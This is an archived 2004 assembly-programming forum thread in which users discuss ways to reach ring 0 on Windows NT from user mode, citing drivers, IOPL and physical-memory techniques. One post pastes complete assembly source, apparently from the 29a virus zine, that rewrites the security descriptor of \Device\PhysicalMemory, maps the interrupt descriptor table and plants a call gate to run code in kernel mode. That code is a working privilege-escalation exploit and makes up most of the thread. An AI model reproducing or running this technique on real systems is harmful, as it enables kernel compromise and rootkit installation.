<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>Ring 0 access - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=20093" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=20093">Ring 0 access</a></p>
   <div class="post" id="post-153963">
    <div class="subject"><a href="#post-153963">Ring 0 access</a></div>
    <div class="body">Sorry to ask this question, I'm sure it has been up like a hundred times.. I have searched around on google for a while now, but I can't find any paper that show some methods to get ring 0 access in win nt.. Does anyone here have some links or know where I can get papers on that subject. I remember I had some info on this subject a while ago but then I formated my hdd so I don't have it anymore..</div>
    <div class="meta">Posted on 2004-12-09 13:55:36 by dev_zero</div>
   </div>
   <div class="post" id="post-153965">
    <div class="subject"><a href="#post-153965">Ring 0 access</a></div>
    <div class="body">You will need to learn how to create a device driver.<br />Read the Four-F tutorials at<br />http://www.freewebs.com/four-f/</div>
    <div class="meta">Posted on 2004-12-09 14:10:27 by Opcode</div>
   </div>
   <div class="post" id="post-153966">
    <div class="subject"><a href="#post-153966">Ring 0 access</a></div>
    <div class="body">Can you clarify your question?  Do you want to get access to instructions from ring3 that are typically restricted to ring0?  What type of code do you want to run at ring0?<br /><br />You can use NtSetInformationProcess with the ProcessUserModeIOPL(16) PROCESSINFOCLASS to give you the ability to use restricted instructions/ports at ring3.  This requires SeTcbPrivilege.  (example: <a target="_blank" href="http://ry.pl/~omega/progs/DirectIO.rar">http://ry.pl/~omega/progs/DirectIO.rar</a>).<br /><br />You can open \Device\PhysicalMemory and twiddle things to grant you ring0 access from ring3 (example: <a target="_blank" href="http://www.phrack.org/show.php?p=59&amp;a=16">http://www.phrack.org/show.php?p=59&amp;a=16</a>).<br /><br />Or, you can write a device driver which is the cleanest way to do it.  However, given that your motivations are unknown it is hard to recommend a particular solution.</div>
    <div class="meta">Posted on 2004-12-09 14:13:17 by nohaven</div>
   </div>
   <div class="post" id="post-153968">
    <div class="subject"><a href="#post-153968">Ring 0 access</a></div>
    <div class="body">I found this little &quot;utility&quot; in the latest release of 29a.. I'm trying to get a little more information on how you can to get to ring 0.. I have read about a method where they use the SIDT instruction to hook an interrupt and so on and I think I have found this method used in this application, but I can't get the program to work. I have tried debugging it with IDA but the whole computer shutsdown when the bluescreen comes.. Can somebody with some more knowledge help me figuring this one out..?<br /><pre><code>.386p<br />.model  flat<br /><br />extern  GetModuleHandleA&#58;proc<br />extern  GetProcAddress&#58;proc<br />extern  LoadLibraryA&#58;proc<br />extern  FreeLibrary&#58;proc<br />extern  CloseHandle&#58;proc<br />extern  MapViewOfFile&#58;proc<br />extern  UnmapViewOfFile&#58;proc<br />extern  WriteFile&#58;proc<br />extern  ExitProcess&#58;proc<br /><br />OBJ_CASE_INSENSITIVE            equ     40h<br />SECTION_MAP_WRITE               equ     2<br />SECTION_MAP_READ                equ     4<br />MEM_PRIVATE                     equ     20000h<br />MEM_MAPPED                      equ     40000h<br />DACL_SECURITY_INFORMATION       equ     4<br />SE_KERNEL_OBJECT                equ     6<br />GRANT_ACCESS                    equ     1<br />NO_MULTIPLE_TRUSTEE             equ     0<br />TRUSTEE_IS_NAME                 equ     1<br />TRUSTEE_IS_USER                 equ     1<br />INTNUMBER                       equ     0ffh<br /><br />.data<br />ntdll                   db      &quot;ntdll&quot;, 0<br />NtOpenSection           db      &quot;NtOpenSection&quot;, 0<br />SetSecurityInfo         db      &quot;SetSecurityInfo&quot;, 0<br />SetEntriesInAclA        db      &quot;SetEntriesInAclA&quot;, 0<br />GetSecurityInfo         db      &quot;GetSecurityInfo&quot;, 0<br />advapi32                db      &quot;advapi32&quot;, 0<br />object_name             dw      offset object_buffer_e1 - offset object_buffer, offset object_buffer_e2 - offset object_buffer<br />                        dd      offset object_buffer<br />object_buffer           dw      '\', 'd', 'e', 'v', 'i', 'c', 'e', '\', 'p', 'h', 'y', 's', 'i', 'c', 'a', 'l', 'm', 'e', 'm', 'o', 'r', 'y'<br />object_buffer_e1        dw      0<br />object_buffer_e2        equ     $<br />align 4 ;required for object_attributes<br />object_attributes       dd      offset object_attributes_e - offset object_attributes, 0, offset object_name, OBJ_CASE_INSENSITIVE, 0, 0<br />object_attributes_e     equ     $<br />explicit_access         dd      SECTION_MAP_WRITE, GRANT_ACCESS, 0, 0, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_NAME, TRUSTEE_IS_USER, offset current_user<br />current_user            db      &quot;CURRENT_USER&quot;, 0<br />instaddr                db      0ah dup &#40;?&#41;<br /><br />.code<br />code_begin      label   near<br />        push    offset ntdll<br />        call    GetModuleHandleA<br />        test    eax, eax<br />        je      exit_code<br />        push    offset NtOpenSection<br />        push    eax<br />        call    GetProcAddress<br />        xchg    esi, eax<br />        push    eax<br />        mov     ebx, esp<br />        mov     edi, offset object_attributes<br />        push    edi<br />        push    SECTION_MAP_READ or SECTION_MAP_WRITE<br />        push    ebx<br />        call    esi<br />        test    eax, eax<br />        jns     hook_interrupt<br />        push    edi<br />        push    MEM_MAPPED or MEM_PRIVATE<br />        push    ebx<br />        call    esi<br />        push    eax<br />        mov     ebp, esp<br />        xor     eax, eax<br />        push    eax<br />        push    eax<br />        mov     ecx, esp<br />        push    eax<br />        mov     edx, esp<br />        push    eax<br />        push    DACL_SECURITY_INFORMATION<br />        push    SE_KERNEL_OBJECT<br />        push    dword ptr &#91;ebx&#93;<br />        push    offset SetSecurityInfo<br />        push    ecx<br />        push    edx<br />        push    offset explicit_access<br />        push    1<br />        push    offset SetEntriesInAclA<br />        push    ebp<br />        push    eax<br />        push    edx<br />        push    eax<br />        push    eax<br />        push    DACL_SECURITY_INFORMATION<br />        push    SE_KERNEL_OBJECT<br />        push    dword ptr &#91;ebx&#93;<br />        push    offset GetSecurityInfo<br />        push    offset advapi32<br />        call    LoadLibraryA<br />        push    eax<br />        xchg    ebp, eax<br />        call    GetProcAddress<br />        call    eax<br />        push    ebp<br />        call    GetProcAddress<br />        call    eax<br />        push    ebp<br />        call    GetProcAddress<br />        call    eax<br />        pop     eax<br />        push    ebp<br />        call    FreeLibrary<br />        push    dword ptr &#91;ebx&#93;<br />        call    CloseHandle<br />        push    edi<br />        push    SECTION_MAP_READ or SECTION_MAP_WRITE<br />        push    ebx<br />        call    esi<br />        test    eax, eax<br />        js      exit_code<br /><br />hook_interrupt  label   near<br />        push    eax<br />        sidt    fword ptr &#91;esp - 2&#93;<br />        pop     esi<br />        btr     esi, 1fh<br />        push    1<br />        push    esi<br />        push    0<br />        push    SECTION_MAP_WRITE<br />        push    dword ptr &#91;ebx&#93;<br />        call    MapViewOfFile<br />        push    eax<br />        and     esi, 0fffh<br />        lea     esi, dword ptr &#91;eax + esi + INTNUMBER * 8&#93;<br />        fild    qword ptr &#91;esi&#93;<br />        call    skip_ring0<br /><br />        ;begin ring 0<br /><br />        mov     ebp, cr0<br />        iretd<br /><br />        ;end ring 0<br /><br />skip_ring0      label   near<br />        pop     word ptr &#91;esi&#93;<br />        mov     byte ptr &#91;esi + 2&#93;, 8<br />        mov     byte ptr &#91;esi + 5&#93;, 0eeh<br />        pop     word ptr &#91;esi + 6&#93;<br />        int     INTNUMBER<br />        fistp   qword ptr &#91;esi&#93;<br />        call    UnmapViewOfFile<br />        call    CloseHandle<br />        push    0<br />        push    esp<br />        push    size instaddr<br />        mov     edi, offset instaddr<br />        push    edi<br />        push    -11                             ;STD_OUTPUT_HANDLE<br />        call    hex2asc                         ;convert offset to ASCII<br />        mov     ax, 0a0dh<br />        stos    word ptr &#91;edi&#93;<br />        call    WriteFile                       ;print to screen<br /><br />exit_code       label   near<br />        push    0<br />        call    ExitProcess<br /><br />hex2asc         proc    near<br />        call    dd2asc<br /><br />dd2asc          proc    near<br />        call    dw2asc<br /><br />dw2asc          proc    near<br />        shld    eax, ebp, 8<br />        shl     ebp, 8<br />        aam     10h<br />        call    db2asc<br /><br />db2asc          proc    near<br />        xchg    ah, al<br />        cmp     al, 0ah<br />        sbb     al, 69h<br />        das<br />        stos    byte ptr &#91;edi&#93;<br />        ret<br />db2asc          endp<br />dw2asc          endp<br />dd2asc          endp<br />hex2asc         endp<br />end             code_begin<br /></code></pre></div>
    <div class="meta">Posted on 2004-12-09 15:14:04 by dev_zero</div>
   </div>
   <div class="post" id="post-153971">
    <div class="subject"><a href="#post-153971">Ring 0 access</a></div>
    <div class="body">Read the article cited by nohaven:<br /><br /><div class="quote"><br />You can open \Device\PhysicalMemory and twiddle things to grant you ring0 access from ring3 (example: <a target="_blank" href="http://www.phrack.org/show.php?p=59&amp;a=16">http://www.phrack.org/show.php?p=59&amp;a=16</a>).</div><br /><br />And read the Russinovich article:<br />http://www.sysinternals.com/ntw2k/info/tips.shtml#kmem</div>
    <div class="meta">Posted on 2004-12-09 16:31:56 by Opcode</div>
   </div>
  </div>
 </body>
</html>